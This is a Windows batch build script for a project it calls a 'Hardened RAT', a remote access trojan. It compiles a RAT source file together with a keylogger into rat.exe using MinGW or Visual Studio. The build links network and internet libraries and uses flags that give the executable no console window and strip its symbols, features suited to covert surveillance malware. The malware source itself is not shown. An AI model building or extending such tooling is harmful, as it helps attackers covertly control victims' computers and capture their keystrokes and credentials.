@echo off
REM Hardened RAT Build Script - Windows
REM Requires MinGW-w64 or Visual Studio

echo ========================================
echo  Hardened RAT - Build Script
echo ========================================
echo.

cd /d "%~dp0.."

REM Check if source files exist
if not exist "src\hardened_rat.c" (
    echo ERROR: Source files not found!
    pause
    exit /b 1
)

echo [*] Building hardened RAT...
echo.

REM Try MinGW first
where gcc >nul 2>&1
if %ERRORLEVEL% EQU 0 (
    echo [+] Using MinGW-w64 compiler
    gcc -o rat.exe src\hardened_rat.c src\keylogger.c ^
        -lws2_32 -ladvapi32 -luser32 -lwininet ^
        -mwindows ^
        -O2 ^
        -s ^
        -static-libgcc
    
    if exist "rat.exe" (
        echo.
        echo [+] Build successful: rat.exe
        echo [+] Size: 
        dir rat.exe | find "rat.exe"
        echo.
        echo [*] Run 'rat.exe' to execute
        pause
        exit /b 0
    ) else (
        echo.
        echo [-] Build failed!
        pause
        exit /b 1
    )
)

REM Try Visual Studio
where cl >nul 2>&1
if %ERRORLEVEL% EQU 0 (
    echo [+] Using Visual Studio compiler
    cl /Fe:rat.exe src\hardened_rat.c src\keylogger.c ^
       /link ws2_32.lib advapi32.lib user32.lib wininet.lib ^
       /SUBSYSTEM:WINDOWS ^
       /ENTRY:WinMainCRTStartup
    
    if exist "rat.exe" (
        echo.
        echo [+] Build successful: rat.exe
        pause
        exit /b 0
    ) else (
        echo.
        echo [-] Build failed!
        pause
        exit /b 1
    )
)

echo [-] No compiler found!
echo [!] Please install MinGW-w64 or Visual Studio
pause
exit /b 1
